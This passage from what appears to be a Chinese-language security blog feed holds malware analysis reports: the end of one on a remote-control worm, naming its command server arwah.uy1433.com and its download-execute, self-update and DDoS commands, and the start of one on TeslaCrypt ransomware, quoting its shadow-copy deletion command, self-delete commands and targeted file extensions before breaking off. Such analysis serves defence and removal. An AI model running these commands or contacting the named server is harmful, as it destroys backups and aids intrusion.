src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568550413617.png" alt="1568550413617"></p></li></ul><h3 id="线程2：与远控服务器通信，执行指令"><a href="#线程2：与远控服务器通信，执行指令" class="headerlink" title="线程2：与远控服务器通信，执行指令"></a>线程2：与远控服务器通信，执行指令</h3><p>首先初始化了winsock服务，然后是循环，获取当前系统时间，并进行了判断当日期大于2013年2月21日后，<font color=red>便不断创建线程2.1</font>，创建套接字链接远程服务器，获取指令执行命令。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552086331.png" alt="1568552086331"></p><h4 id="线程2-1：与远控服务器通信，获取指令并执行"><a href="#线程2-1：与远控服务器通信，获取指令并执行" class="headerlink" title="线程2.1：与远控服务器通信，获取指令并执行"></a>线程2.1：与远控服务器通信，获取指令并执行</h4><h5 id="初始化套接字，并建立链接"><a href="#初始化套接字，并建立链接" class="headerlink" title="初始化套接字，并建立链接"></a>初始化套接字，并建立链接</h5><p>现通过htons函数将整型变量<font color=red>8090</font>转换成网络字节顺序，初始化端口。</p><p>然后通过<font color=red>Swap_init_IPaddr</font>将域名“<font color=red>arwah.uy1433.com</font>”转换为IP地址，然后初始化<font color=red>socket</font>，然后通过函数<font color=red>connect</font>连接该套接字。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568554186815.png" alt="1568554186815"></p><ul><li>其中<font color=red>Swap_init_IPaddr</font>，转化IP的代码如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568554466165.png" alt="1568554466165"></p><h5 id="获取主机信息并发送致远控服务器"><a href="#获取主机信息并发送致远控服务器" class="headerlink" title="获取主机信息并发送致远控服务器"></a>获取主机信息并发送致远控服务器</h5><p>先与套接字建立连接，然后执行<font color=red>get_info_405150</font>获取主机信息。包括版本信息，内存大小，CPU信息，以及适配器信息等。然后将这些信息，通过套接字发送到远控服务器上。</p><p><strong>将获取到的数据发送给远程服务器，如下图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568599865588.png" alt="1568599865588"></p><p><strong>获取到的主机信息，如下图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601803942.png" alt="1568601803942"></p><ul><li><strong>其中get_info_405150获取系统信息函数，如下：</strong></li><li><ul><li>1.判断当前操作系统版本</li><li>通过Getversion函数，获取操作系统信息，再根据获取到的操作系统信息，判断当前操作系统的版本，如图：</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552954567.png" alt="1568552954567"></p><ul><li><ul><li>2.获取CPU频率</li><li>通过获取注册表中的键值，来获取CPU的频率信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568552888140.png" alt="1568552888140"></p><ul><li><ul><li>3.获取物理和虚拟内存信息</li><li>通过<font color=red>GlobalMemoryStatsEx</font>来获取系统物理和虚拟内存信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568553016127.png" alt="1568553016127"></p><ul><li><ul><li>4.获取适配器信息</li><li>通过<font color=red>GetAdaptersInfo</font>检索本地计算机的适配器信息，然后获取到网络适配器的网络信息。</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568553326893.png" alt="1568553326893"></p><h5 id="接收指令执行操作"><a href="#接收指令执行操作" class="headerlink" title="接收指令执行操作"></a>接收指令执行操作</h5><p>创建死循环，通过调用<font color=red>receive_info_4036C8</font>来接收远控服务器下发的指令，然后根据下发的指令进行相应的操作，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568598189550.png" alt="1568598189550"></p><ul><li>其中<font color=red>receive_info_4036C8</font>函数，通过函数<font color=red>rec</font>来接收远控服务器下发的指令或数据，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568562440939.png" alt="1568562440939"></p><h5 id="接收的指令为：0x10，下载并执行"><a href="#接收的指令为：0x10，下载并执行" class="headerlink" title="接收的指令为：0x10，下载并执行"></a>接收的指令为：0x10，下载并执行</h5><p>当接收到是0x10时，通过<font color=red>URLDownloadToFileA</font>将接收的数据写入临时文件夹下，并以系统自启动以来的毫秒数来命名。当下载完后，运行下载后的程序。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568562998892.png" alt="1568562998892"></p><h5 id="接收的指令为：0x12，更新自身"><a href="#接收的指令为：0x12，更新自身" class="headerlink" title="接收的指令为：0x12，更新自身"></a>接收的指令为：0x12，更新自身</h5><p>先关闭之前创建的<font color=red>.Net CLR</font>互斥体，通过<font color=red>URLDownloadToFileA</font>将接收的数据写入临时文件夹下，并以随机字符串命名。然后关闭之前创建的<font color=red>.Net CLR</font>服务,并删除注册表项<font color=red>.Net CLR</font>，然后再删除自身，运行下载后的程序。这里推测是<font color=red>更新自身</font>。</p><ul><li>关闭之前创建的互斥体如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601120782.png" alt="1568601120782"></p><ul><li>下载文件，并以随机字符串命名如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601212938.png" alt="1568601212938"></p><ul><li>关闭服务如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601292710.png" alt="1568601292710"></p><ul><li>删除注册表项和自身文件，并运行下载后的文件，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601380109.png" alt="1568601380109"></p><h5 id="接收的指令为：0x14，打开IE"><a href="#接收的指令为：0x14，打开IE" class="headerlink" title="接收的指令为：0x14，打开IE"></a>接收的指令为：0x14，打开IE</h5><p>打开<font color=red>Iexplore.exe</font>，并执行接收到的参数，初步推断为访问某些特殊的网站刷流量。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568601454250.png" alt="1568601454250"></p><h5 id="接受的指令为：0x06，删除自身"><a href="#接受的指令为：0x06，删除自身" class="headerlink" title="接受的指令为：0x06，删除自身"></a>接受的指令为：0x06，删除自身</h5><p>先关闭之前创建的互斥体<font color=red>.Net CLR</font>，关闭服务<font color=red>.NET CLR</font>,然后再删除注册表项<font color=red>.Net CLR</font>,删除自身，退出进程。</p><ul><li>关闭互斥体，关闭服务，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568602630773.png" alt="1568602630773"></p><ul><li>删除注册表项，删除自身，退出进程，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568602700057.png" alt="1568602700057"></p><h5 id="接收的指令小于0x06时，进行DDOS攻击"><a href="#接收的指令小于0x06时，进行DDOS攻击" class="headerlink" title="接收的指令小于0x06时，进行DDOS攻击"></a>接收的指令小于0x06时，进行DDOS攻击</h5><p>当收到的指令小于6时，再次进行<font color=red>switch case</font>判断。根据接收的参数，构造套接字，或是请求包头来进行连接。推测是进行<font color=red>DDOS攻击</font>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605182440.png" alt="1568605182440"></p><ul><li>其中当接收的指令为：0x02，执行<font color=red>sub_4030A5</font>，根据收到的数据，初始化不同的套接字，并最终都交由<font color=red>LABEL_29</font>来创建循环，不断进行链接，如图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568604291694.png" alt="1568604291694"></p><ul><li><p>其中当接收的指令为：0x03时，执行<font color=red>sub_4031F0</font>，根据接收到的参数，构造请求包头，并最终<font color=red>创建死循环不断进行连接</font>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605639197.png" alt="1568605639197"></p><ul><li>其中<font color=red>sub_406C60</font>构造的比较特殊的请求包头，如图：</li><li><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605762398.png" alt="1568605762398"></li></ul></li></ul><h3 id="线程3：与线程2-1基本一样，只是远控服务器地址为内网IP"><a href="#线程3：与线程2-1基本一样，只是远控服务器地址为内网IP" class="headerlink" title="线程3：与线程2.1基本一样，只是远控服务器地址为内网IP"></a>线程3：与线程2.1基本一样，只是远控服务器地址为内网IP</h3><p>线程3与线程2.1大体上都是一致的，唯一的区别在于远控服务器不再是<font color=red>arwah.uy1433.com</font>，而变成了写死的内网IP：<font color=red>192.168.1.107:83</font>。而且该IP地址是通过解密函数获取到的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568605994098.png" alt="1568605994098"></p><p>除黄色标识处不同外，其他部分都与线程2.1一致，这里便不再分析。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/02_sample%E8%BF%9C%E6%8E%A7/1568606079331.png" alt="1568606079331"></p><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>C&amp;C服务器</th></tr></thead><tbody><tr><td><strong>arwah.uy1433.com</strong></td></tr><tr><td><strong>192.168.1.107:83</strong></td></tr></tbody></table><h1 id="0x03-查杀、防御技术方案"><a href="#0x03-查杀、防御技术方案" class="headerlink" title="0x03 查杀、防御技术方案"></a>0x03 查杀、防御技术方案</h1><h2 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h2><p>由于该样本设置了一个服务<font color=red>.Net CLR</font>，所以首先先关闭服务，并删除该服务。</p><h2 id="修复注册表"><a href="#修复注册表" class="headerlink" title="修复注册表"></a>修复注册表</h2><p>由于上面提到的该样本创建了服务，对注册表进行了修改，所以这里需要对注册表进行修复，操作如下：</p><ul><li>删除注册表项<font color=red>HKEY_LOCAL_MACHINE\system\currentcontrolset\services.Net CLR</font>中的所有内容。</li></ul><h2 id="删除病毒文件"><a href="#删除病毒文件" class="headerlink" title="删除病毒文件"></a>删除病毒文件</h2><ul><li><p>删除样本本身。</p></li><li><p>删除释放出来的hra33.dll。</p></li><li><p>查看下表中的文件路径，若该文件存在，则删除。</p><table><thead><tr><th>拷贝的目标盘符：</th></tr></thead><tbody><tr><td>\10.95.16.1\admin$\g1fd.exe</td></tr><tr><td>\10.95.16.1\c$\NewArean.exe</td></tr><tr><td>\10.95.16.1\D$\g1fd.exe</td></tr><tr><td>\10.95.16.1\E$\g1fd.exe</td></tr><tr><td>\10.95.16.1\F$\g1fd.exe</td></tr></tbody></table></li><li><p>检查临时文件夹，是否存在以随机数命名的文件，且大小hash与该样本一致，若存在直接删除。</p></li></ul><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>这个样本是一个远控和蠕虫病毒的结合体，释放hra33.dll，由于该样本无法正常跑起来，因此没法详细分析该释放出来的hra33.dll。这次分析的蠕虫病毒是通过初始化一个简单的字典，通过爆破局域网内的主机来进行传播的。并且该蠕虫病毒可以通过C&amp;C服务器获取指令，执行不同操作，主要操作有：下载文件并执行，更新自身，DDOS攻击等。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 蠕虫 </tag>
            
            <tag> .Net </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TeslaCrypt勒索病毒</title>
      <link href="2019/09/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2019/09/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size =9> <b>TeslaCrypt勒索病毒 </b></font></center><h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>tfukrc.exe</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>勒索病毒</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>235KB（240,640字节）</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>72CCC18F3038E19273010D45AC2142CE</strong></td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>该病毒原名为Tesla Crypt勒索病毒，勒索信息中提示是通过RSA加密算法进行加密的，但通过分析，发现该样本是通过AES加密算法对文件进行大量的加密操作，从而进行勒索。由于他的主密钥已经由开发者公布，故该勒索病毒是可以进行解密的。</p></blockquote><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/liuchengtu.png" alt="liuchengtu"></p><h1 id="0x01-样本细节详细分析"><a href="#0x01-样本细节详细分析" class="headerlink" title="0x01 样本细节详细分析"></a>0x01 样本细节详细分析</h1><h2 id="样本行为分析"><a href="#样本行为分析" class="headerlink" title="样本行为分析"></a>样本行为分析</h2><h3 id="1-文件写入行为分析"><a href="#1-文件写入行为分析" class="headerlink" title="1.文件写入行为分析"></a>1.文件写入行为分析</h3><ul><li>运行样本后，该样本复制自身文件，到<font color=red>C:\Users&lt;username&gt;\Documents\</font> 目录下，并更名为一个随机名:这里是<font color=red>lohdrw.exe</font>，如图1：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567409136692.png" alt="1567409136692"></p><center>图1</center><ul><li>然后该样本结束自身，并调用被释放出来的<font color=red>lohdrw.exe</font>程序，对文件进行了大量的写入行为，如图2所示：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567395508873.png" alt="1567395508873"></p><center> 图2 </center><p>打开被写入过的txt文件，发现内容都被加密过了，如图3：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567410245244.png" alt="1567410245244"></p><center>图3</center><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><p>查看进程树，逐条进行分析。进程树如图4：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567410561150.png" alt="1567410561150"></p><center>图4</center><ul><li><p>运行该样本后，释放了<font color=red>lohdrw.exe</font>，并运行了改exe程序。然后该exe对文件进行了大量的写入，可见图2。</p></li><li><p>然后<font color=red>lohdrw.exe</font>先后调用了两次<font color=red>vssadmin.exe</font>(卷影拷贝服务)。执行了如下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin.exe Delete Shadows &#x2F;ALL &#x2F;Quiet</span><br></pre></td></tr></table></figure><p>静默删除全部卷影副本。<font color=red>防止通过本地恢复</font>。如图5:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567411572570.png" alt="1567411572570"></p><center>图5</center></li><li><p>然后调用<font color=red>NOTEPAD.exe</font>，执行病毒路径下的txt文件，弹出勒索信息内容。如图6：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567412221894.png" alt="1567412221894"></p><center>图6</center></li><li><p>最后调用cmd执行如下命令，删除自身。如图7：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd /c DEL C:\Users john\DOCUMENT\Vohdrw.exe&gt;&gt;NUL</span><br><span class="line">cmd /c DEL C:\Users john\Desktop\tfukrc\tfukrc.exe &gt;&gt;NUL</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567412539335.png" alt="1567412539335"></p><center>图7</center></li></ul><h3 id="3-网络行为分析"><a href="#3-网络行为分析" class="headerlink" title="3.网络行为分析"></a>3.网络行为分析</h3><ul><li>样本进行了大量的网络行为，如图8：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567413133164.png" alt="1567413133164"></p><center>图8</center><h3 id="4-注册表行为分析"><a href="#4-注册表行为分析" class="headerlink" title="4.注册表行为分析"></a>4.注册表行为分析</h3><ul><li>修改注册表，添加了自启动项，在注册表<font color=red>HRCU\Software\Microsoft\Windows\CurrentVersion\Run</font>目录下添加键值,并设置路径为释放出的<font color=red>lohdrw.exe</font>。如图9</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567413261912.png" alt="1567413261912"></p><center>图9</center><h2 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h2><h3 id="找到主函数入口："><a href="#找到主函数入口：" class="headerlink" title="找到主函数入口："></a>找到主函数入口：</h3><p>首先找到主函数入口点，从_tmainCRTStartup中找到主函数入口点<font color=red>wWinMain</font>。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567837425099.png" alt="1567837425099"></p><h3 id="反沙箱"><a href="#反沙箱" class="headerlink" title="反沙箱"></a>反沙箱</h3><p>进入主函数我WinMain中后，该样本首先初始化了COM组件，并调用了<font color=red>FIlterGraph组件</font>，来检查音频设备是否存在，从而判断是否是沙箱环境。若判断是沙箱环境，直接退出程序，不再执行。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567843869096.png" alt="1567843869096"></p><h3 id="关闭安全警告弹窗"><a href="#关闭安全警告弹窗" class="headerlink" title="关闭安全警告弹窗"></a>关闭安全警告弹窗</h3><p>由于样本的传播途径可能由很多种，其中若是通过IE浏览器下载的话，会默认再所下载的文件中默认添加一个隐藏文件流：filename<font color=red>:zone.identifier</font>。如果有该隐藏文件流，再运行该程序的时候，会弹出警告窗口。</p><p>所以该样本获取到完整文件路径后，通过字符串拼接出：filename<font color=red>:zone.identifier</font>，然后将其删除。来阻止弹出警告窗口。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567844819428.png" alt="1567844819428"></p><h3 id="解密指令与勒索信息"><a href="#解密指令与勒索信息" class="headerlink" title="解密指令与勒索信息"></a>解密指令与勒索信息</h3><p>该样本通过解密函数，解密出后面所用到的一些数据信息。其中调用了下图中<font color=red>init_key_encode_42B00</font>函数初始化了一个大小为244字节的密钥，然后通过该密钥去解密信息。如下图：</p><p>其中解密出来的数据都有：<font color=red>解密出要加密的文件后缀名；解密出勒索提示信息的文件名；解密出要执行指令；解密出而异域名以及网络请求头；以及勒索文本信息</font></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567847268237.png" alt="1567847268237"></p><ul><li><p>要加密的文件类型，就是解密出来的后缀名。解密出的后缀名，如表1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.r3d .ptx .pef .srw .x3f .der .cer .crt .pem .odt .ods .odp .odm .odc .odb .doc .docx .kdc .mef .mrwref .nrw .orf .raw .rwl .rw2 .mdf .dbf .psd .pdd .pdf .eps .jpg .jpe .dng .3fr .arw .srf .sr2 .bay .crw .cr2 .dcr .ai .indd .cdr .erf .bar .hkx .raf .rofl .dba .db0 .kdb .mpqge .vfs0 .mcmeta .m2 .lrf .vpp_pc .ff .cfr .snx .lvl .arch00 .ntl .fsh  .itdb .itl .mddata .sidd .sidn .bkf .qic .bkp .bc7 .bc6 .pkpass .tax .gdb .qdf .t12 .t13.ibank .sum .sie .zip .w3x .rim .psk .tor .vpk .iwd .kf .mlx .fpk .dazip .vtf .vcf .esm .blob .dmp .layout .menu .ncf .sid .sis .ztmp .vdf .mov .fos .sb .itm .wmo .itm .map .wmo .sb .svg .cas .gho .syncdb .mdbackup .hkdb .hplg .hvpl .icxs .docm .wps .xls .xlsx .xlsm .xlsb .xlk .ppt .pptx .pptm .mdb .accdb .pst .dwg .xf .dxg .wpd .rtf .wb2 .pfx .p12 .p7b .p7c .txt .jpeg .png .rb .css .js .flv .m3u .py .desc .xxx .litesql wallet .big .pak .rgss3a .epk .bik .slm .lbf .sav .re4 .apk .bsa .ltx .forge .asset .litemod .iwi .das .upk .d3dbsp .csv .wmv .avi .wma .m4a .rar .7z .mp4 .sql .bak .tiff</span><br></pre></td></tr></table></figure><center>表1</center></li><li><p>解密出来的指令，如表2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 